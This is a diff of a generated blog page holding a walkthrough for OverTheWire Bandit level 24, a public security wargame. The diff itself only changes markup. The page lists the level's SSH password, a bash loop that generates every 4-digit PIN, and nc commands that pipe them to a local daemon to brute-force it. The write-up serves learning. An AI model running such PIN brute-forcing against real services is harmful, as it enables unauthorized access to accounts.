@@ -16,7 +16,7 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="generator" content="Hugo 0.92.2" />
+  <meta name="generator" content="Hugo 0.81.0" />
   
   
       
@@ -118,19 +118,19 @@
 <h3 id="solution-">Solution :</h3>
 <p>Command to connect remote host : <code>ssh bandit24@bandit.labs.overthewire.org -p 2220</code> password is <code>UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</code> .</p>
 <p>We can connect on port 30002 in a same way as we have done in level 20. We also have to pass password for current level and the 4 digit pin.The command is</p>
-<pre tabindex="0"><code>nc localhost 30002  UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ****
+<pre><code>nc localhost 30002  UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ****
 </code></pre><p>To brute-force pin we wil write a shell script in <em>/tmp/mydir123</em> directory.</p>
 <p>The script is</p>
-<pre tabindex="0"><code>#!/bin/bash
+<pre><code>#!/bin/bash
 for i in {0000..9999}
 do 
 	echo &quot;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i&quot;
 done
 </code></pre><p>The name of the script is <em>bruteforcescript.sh</em> and file <em>combinations.txt</em> will store all combinations of 4 digit number with password for bandit20. First we have to make bruteforcescript.sh executable using command</p>
-<pre tabindex="0"><code>chmod 700 bruteforcescript.sh
+<pre><code>chmod 700 bruteforcescript.sh
 ./bruteforcescript.sh &gt; combinations.txt
 </code></pre><p>And the final command is</p>
-<pre tabindex="0"><code>nc localhost 30002 &lt; combinations.txt
+<pre><code>nc localhost 30002 &lt; combinations.txt
 </code></pre><p>The password for the next level is <code>****</code> .</p>
 <p><img src="/assets/images/Bandit-Overthewire/bandit_l2425_terminal.jpg" alt="Bandit Level 24 25"></p>
 <p>Reference : <a href="https://unix.stackexchange.com/questions/432904/brute-force-4-digit-pin-with-pass-using-shell-script">https://unix.stackexchange.com/questions/432904/brute-force-4-digit-pin-with-pass-using-shell-script</a><!-- raw HTML omitted -->
